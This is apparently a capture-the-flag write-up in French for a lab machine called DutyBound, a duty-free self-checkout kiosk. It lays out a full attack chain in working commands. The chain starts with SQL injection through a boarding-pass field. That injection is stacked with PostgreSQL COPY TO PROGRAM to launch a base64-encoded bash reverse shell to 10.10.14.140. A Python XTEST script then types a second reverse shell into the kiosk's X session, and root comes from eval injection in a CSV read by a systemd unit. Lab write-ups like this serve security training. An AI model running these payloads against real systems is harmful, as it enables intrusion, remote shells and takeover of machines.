  # DutyBound

	echo "10.129.137.179 airsnacks.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.129.137.179 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.129.137.179 -oN nmap.txt

Scans classiques.

	PORT    STATE SERVICE VERSION
	22/tcp  open  ssh     OpenSSH 8.9p1
	80/tcp  open  http    nginx (redirige vers HTTPS)
	443/tcp open  http    nginx 1.18.0

Self-checkout de boutique duty-free. Routes classiques (/browse, /cart, /checkout/boarding-pass). Le JS frontend (/static/app.js) révèle l'endpoint réellement appelé par le scanner de carte d'embarquement :

	postJSON("/checkout/boarding-pass/verify", { raw: "" })

Testable direct en HTTP, pas besoin du scanner physique. Il faut d'abord un article dans le panier pour arriver au checkout :

	COOKIES=/tmp/cookies.txt
	curl -ks -c "$COOKIES" -b "$COOKIES" -H 'Content-Type: application/json' -d '{"sku":"SNK-CRN"}' https://airsnacks.htb/cart/add

Une requête vide sur /verify renvoie des erreurs qui donnent la structure attendue (format BCBP, Bar Coded Boarding Pass, le standard de carte d'embarquement). En itérant sur les messages d'erreur (BCBP_ERR_SEAT_FORMAT, BCBP_ERR_CONDITIONAL_REQUIRED, etc.) on reconstruit un payload qui passe la validation.

Carte d'embarquement valide construite à la main, avec la partie "airline use" (section libre en fin de BCBP, non validée) utilisée pour injecter :

	curl -ks -c "$COOKIES" -b "$COOKIES" -H 'Content-Type: application/json' \
	  -d '{"raw":"M1SMITH/JOHN          EABC123 YULFRAAC 0834 226F001A0025 18D>70B2026299BAC 03AAA'"'"'"}' \
	  https://airsnacks.htb/checkout/boarding-pass/verify

Un simple guillemet simple dans l'airline use fait planter la requête, la donnée atterrit dans une requête SQL construite par interpolation de string (pas de requêtes préparées), côté logging d'audit (table bp_scan_audit). Vérification du rôle PostgreSQL utilisé par l'appli, via une conversion forcée en erreur (type cast sur current_user) :

> airsnacks_app

Ce rôle n'est pas superuser mais fait partie de pg_execute_server_program donc il peut exécuter des programmes côté serveur via "COPY ... TO PROGRAM". 

Payload final : injection stacked query avec encodage pour éviter les problèmes : 

	B64=$(echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.140/9999 0>&1"' | base64 -w0)

	curl -ks -c "$COOKIES" -b "$COOKIES" -H 'Content-Type: application/json' \
	  -d "{\"raw\":\"M1SMITH/JOHN          EABC123 YULFRAAC 0834 226F001A0025 198>70B2026299BAC 03AAA'); COPY (SELECT '') TO PROGRAM 'echo $B64| base64 -d | bash';--\"}" \
	  https://airsnacks.htb/checkout/boarding-pass/verify

	nc -lvnp 9999

L'utilisateur postgres n'a pas accès au home du kiosque, mais l'énumération des process montre qu'une session graphique Openbox tourne déjà sur le display :0, avec Firefox en mode kiosk, pour l'utilisateur dutyfree-kiosk :

	ps aux | grep -i x11
	w

/etc/xdg/openbox/rc.xml du display montre que Ctrl+Alt+T lance un xterm. python-xlib est dispo sur la machine, avec l'extension XTEST, pas besoin de xdotool, on peut synthétiser des évènements clavier directement sur le display X actif :

	export DISPLAY=:0
	python3 -c "
	from Xlib import X, XK, display
	from Xlib.ext import xtest
	import time
	d = display.Display()
	def key(sym, mod=0):
	    code = d.keysym_to_keycode(XK.string_to_keysym(sym))
	    xtest.fake_input(d, X.KeyPress, code)
	    d.sync(); time.sleep(0.05)
	    xtest.fake_input(d, X.KeyRelease, code)
	    d.sync()
	# Ctrl+Alt+T pour ouvrir un xterm
	ctrl = d.keysym_to_keycode(XK.string_to_keysym('Control_L'))
	alt  = d.keysym_to_keycode(XK.string_to_keysym('Alt_L'))
	t    = d.keysym_to_keycode(XK.string_to_keysym('t'))
	xtest.fake_input(d, X.KeyPress, ctrl)
	xtest.fake_input(d, X.KeyPress, alt)
	xtest.fake_input(d, X.KeyPress, t)
	d.sync(); time.sleep(0.2)
	xtest.fake_input(d, X.KeyRelease, t)
	xtest.fake_input(d, X.KeyRelease, alt)
	xtest.fake_input(d, X.KeyRelease, ctrl)
	d.sync()
	time.sleep(1)
	# Taper la commande dans le xterm fraîchement ouvert
	for c in 'bash -c \"bash -i >& /dev/tcp/10.10.14.140/4445 0>&1\"\n':
	    key(c if c != '\n' else 'Return')
	"

	nc -lvnp 4445

Le xterm s'ouvre dans la session de dutyfree-kiosk et exécute la commande tapée, shell en tant que dutyfree-kiosk.

	cat ~/user.txt

## Élévation de privilèges

	id
	find / -group pos-ops -writable 2>/dev/null

On trouve /opt/vrs/data/duty-rates.csv, root:pos-ops, group-writable. Contenu attendu :

	SPIRITS,45,20
	WINE,25,20
	...

Recherche de ce qui consomme ce fichier :

	systemctl list-units --type=path
	systemctl cat vrs-duty-apply.path
	systemctl cat vrs-duty-apply.service

Un systemd .path unit surveille ce CSV et déclenche (au moindre changement) un service qui tourne en root (/opt/vrs/bin/apply-duty-rates.sh). Le script lit chaque ligne, valide que les deuxième/troisième colonnes sont numériques, mais fait un eval sur la première colonne sans la valider :

	cat /opt/vrs/bin/apply-duty-rates.sh
	# eval "${tax_class}=${duty_pct}"

Injection de code possible à cause du "eval". On garde les lignes originales pour ne pas casser les checks de variables requises plus loin. L'écriture déclenche le path unit, qui lance le service root :

	echo 'cat /root/root.txt > /tmp/pwned,45,20' > /tmp/newline
	cat /opt/vrs/data/duty-rates.csv >> /tmp/newline
	cp /tmp/newline /opt/vrs/data/duty-rates.csv
	# Attendre un peu
	cat /tmp/pwned
